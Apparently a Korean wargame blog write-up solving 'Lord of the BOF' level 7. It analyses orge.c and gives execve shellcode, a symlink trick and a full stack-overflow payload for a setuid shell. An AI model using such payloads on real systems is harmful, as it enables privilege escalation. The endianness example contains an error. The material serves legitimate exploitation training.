---
title: BOF/ LOB-level7(darkelf)
tags: LOB
---

LOB란 The Lord of the BOF의 약자로 Buffer over-flow를 연습해 볼 수 있는 해킹문제이다.    
총 20문제로 구성되어 있으며 각 문제를 격파하여 다음 레벨의 패스워드를 얻는 형식이다.  
문제를 격파하고 다음 레벨의 bash를 획득하였다면 my-pass로 패스워드를 확인할 수 있다.  

 [send me email](mailto:jewel7492@gmail.com) if you have any questions.

<!--more-->

---
### LOB Level 7(darkelf)
**ID : darkelf**  
**PASSWD : kernel crashed**  

```bash
$ bash2
```
풀이 시작 전에 bash2로 꼭 변경  
**bash는 \xff를 \x00(NULL)로 인식하여 제대로 문제를 풀 수 없다.**  

![그림1](/assets/LOB/level7/1.PNG)  
사용자 orge의 권한의 orge파일이 있음을 확인할 수 있다.  
**set-uid가 걸려있으므로 사용자 orge의 권한으로 파일을 실행할 수 있다.**  
**orge파일이 쉘을 실행시키도록 한다면 사용자 orge의 쉘을 획득할 수 있다.**  

<br />
{% highlight C linenos %}  
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orge
        - check argv[0]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // here is changed!
        if(strlen(argv[0]) != 77){
                printf("argv[0] error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
{% endhighlight %}  
**orge.c**

### 소스분석  
1. argc가 2보다 작다면 "ergv error"을 출력하고 프로그램을 종료한다.  
**argc란? - 파라미터의 개수를 의미한다. 즉 main에 최소 2개이상의 인자를 전달하여야 한다.**  
2. argv[0]의 길이가 77이 아닌경우 "argv[0] error"를 출력하고 프로그램을 종료한다.  
**argv[0]는 파일명이다. 따라서 파일명의 길이가 75가 아닌 경우 문제를 해결할 수 없다.**  
**파일을 실행할 때 사용하는 명령어 ./도 포함하여 77이기 때문에 파일명은 75**  
3. 환경변수를 memset으로 초기화  
**환경변수를 이용한 공격 불가**  
4. argv[1][47]의 값이 \xbf가 아닌경우 "stack is still your friend" 출력 후 프로그램 종료  
**RTL기법 사용 불가 What is RTL? - [LOB(level13)](https://limjunho.github.io/2020/03/14/LOB-level13(darkknight).html)**  
5. argv[1]의 길이가 48보다 큰 경우 "argument is too long!"을 출력 후 프로그램 종료  
**RET뒤에 NOP과 ShellCode를 삽입하는 공격 불가**  
6. main에 전달받은 인자 argv[1]을 buffer에 복사하여 출력(argv[0]은 파일명)  
**strcpy함수는 복사할 데이터의 크기제한이 없기 때문에 argv[1]이 40Byte보다 크다면 buffer-overflow가 발생하는 취약점이 있다.**  
7. memset으로 buffer를 모두 0으로 초기화  

### Solution  
**[LOB(level6)](https://limjunho.github.io/2019/11/03/LOB-level6(wolfman).html)와 같이 argv[1]의 주소를 이용한다.**  
**추가로 소스분석2번의 조건을 회피하기 위해 심벌릭링크를 이용하여 파일명의 길이를 75로 맞춘다.**  

**심벌릭링크?**  
링크를 연결하여 원본 파일을 직접 사용하는 것과 같은 효과를 내는 링크이다. 윈도우의 바로가기와 비슷한 개념  

#### level7에서 사용한 쉘코드  
**\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80**
이전에 사용하던 41Byte 쉘코드는 buffer의 크기가 작아 사용하기 어렵기 때문에 25Byte 쉘코드를 사용  

**buffer over-flow를 이용하기 위해서는 프로그램 Stack의 구조를 알아야 한다.**  

스택구조|
---|
buffer(40Byte)|
sfp(4Byte)|
ret(4Byte)| 

**SFP(Stack frame pointer) - 이전 함수의 EBP주소를 담고 있다.**  
(EBP - 스택의 가장 바닥을 가리키는 포인터)  
**RET(Return Address) - 함수가 종료시 return될 주소**  

#### 기존 orge.c를 복사하여 argv[1]의 주소를 출력하는 코드를 추가.   
**buffer에 삽입한 쉘코드는 초기화되지만 argv[1]에는 남아있기 때문에 이를 이용**   

{% highlight C linenos %}  
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orge
        - check argv[0]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // here is changed!
        if(strlen(argv[0]) != 77){
                printf("argv[0] error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
        printf("%p\n", argv[1]);

        // buffer hunter
        memset(buffer, 0, 40);
}
{% endhighlight %}  
**orge.c를 복사하여 소스 추가 -> printf("%p\n", argv[1]);**  


![그림2](/assets/LOB/level7/2.PNG)  
위의 방법으로 argv[1]의 주소를 획득.  
argv[1]의 주소 -> 0xbffffbb5

### Attack  

argv[1]의 주소와 스택의 구조를 파악하였으므로 공격을 시도할 수 있다.  
orge의 권한으로 set-uid가 걸린 orge파일에 심벌릭 링크를 걸고  
**./심벌릭링크 [ShellCode] + [dummy] + [argv(1)주소]**의 형태로 공격.  
**이 때 ShellCode + dummy값의 길이는 buffer의 길이 + sfp(4byte)만큼 즉 44Byte여야 한다.**
**또한 RET에 덮을 argv[1]의 주소는 리틀 엔디안 방식으로 기입한다.**  

**리틀 엔디안은 최 하위 바이트 부터 저장하는 방식이다.**  
ex) 0xbffffc11을 리틀 엔디안 방식으로 저장하면 11cfffbf가 된다.  
보통 엔디안 방식은 CPU 아키텍쳐에 따라 다르지만 intel x86, x64, AMD 계열은 리틀엔디안, 모토로라 프로세서들은 빅엔디안을 사용한다.  
현재 시스템의 엔디안방식을 확인하고 싶다면 echo -n I | od -to2 | head -n1 | awk'{print $2;}' | cut -c6  
명령으로 나오는 값이 1이라면 리틀 엔디안, 0이라면 빅엔디안이다.  

![그림3](/assets/LOB/level7/3.PNG)  
공격 성공.   

**페이로드**  
```bash
$ ./BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB `python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80' + 'A'*19 + '\xb5\xfb\xff\xbf'"`
```